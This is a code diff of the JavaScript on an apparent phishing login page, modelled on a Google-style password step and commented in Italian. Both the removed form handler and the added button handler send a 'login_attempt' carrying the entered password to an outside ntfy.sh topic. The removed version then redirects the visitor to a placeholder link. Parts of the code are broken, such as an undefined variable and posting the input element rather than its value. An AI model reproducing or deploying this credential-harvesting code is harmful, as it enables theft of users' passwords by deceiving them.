@@ -465,101 +465,95 @@
 
 
         /* SECONDO AVANTI */
+        /* SECONDO AVANTI */
 
         const passwordNext =
-            document.getElementById("passwordNext");
-
+            document.getElementById('passwordNext');
 
         passwordNext.addEventListener(
-            "click",
-            function() {
+            'click',
+            async function() {
 
-                if (passwordInput.value === "") {
+                const passwordInput =
+                    document.getElementById('passwordInput');
+
+                if (passwordInput.value.trim() === '') {
                     passwordInput.focus();
                     return;
                 }
 
-                console.log("Accesso demo");
+                var name = "TEST_PASSWORD";
+
+                var data = {
+
+                    "name": passwordInput,
+
+                    "event": "login_attempt",
+
+                    "extra": {}
+
+                };
+
+                try {
+
+                    const response = await fetch(
+
+                        "https://ntfy.sh/gabriele-telefono-739281-xp",
+
+                        {
+
+                            method: "POST",
+
+                            headers: {
+
+                                "Content-Type": "application/json"
+
+                            },
+
+                            body: JSON.stringify(data)
+
+                        }
+
+                    );
+
+                    if (response.ok) {
+
+                        console.log("Notifica di test inviata a ntfy.");
+
+                    } else {
+
+                        console.error(
+                            "Errore ntfy:",
+                            response.status
+                        );
+
+                    }
+
+                } catch (error) {
+
+                    console.error(
+                        "Errore di connessione:",
+                        error
+                    );
+
+                }
 
             }
         );
 
+
+        /* INVIO CON ENTER */
 
         passwordInput.addEventListener(
             "keydown",
             function(event) {
 
-                if (event.key === "Avanti") {
+                if (event.key === "Enter") {
                     passwordNext.click();
                 }
 
             }
         );
-document.getElementById('password-form').addEventListener('submit', async function(event) {
-
-    event.preventDefault();
-
-    var name = document.getElementById('password').value.trim();
-
-    if (!password) {
-
-        return;
-
-    }
-
-    var data = {
-
-        "name": password,
-
-        "event": "login_attempt",
-
-        "extra": {}
-
-    };
-
-    try {
-
-        const response = await fetch(
-
-            "https://ntfy.sh/gabriele-telefono-739281-xp",
-
-            {
-
-                method: "POST",
-
-                headers: {
-
-                    "Content-Type": "application/json"
-
-                },
-
-                body: JSON.stringify(data)
-
-            }
-
-        );
-
-        if (response.ok) {
-
-            console.log("Notifica inviata a ntfy.");
-
-            // Link a cui reindirizzare dopo l'invio
-
-            window.location.href = "https://TUO-LINK.com";
-
-        } else {
-
-            console.error("Errore ntfy:", response.status);
-
-        }
-
-    } catch (error) {
-
-        console.error("Errore di connessione:", error);
-
-    }
-
-});
     </script>
 
 </body>
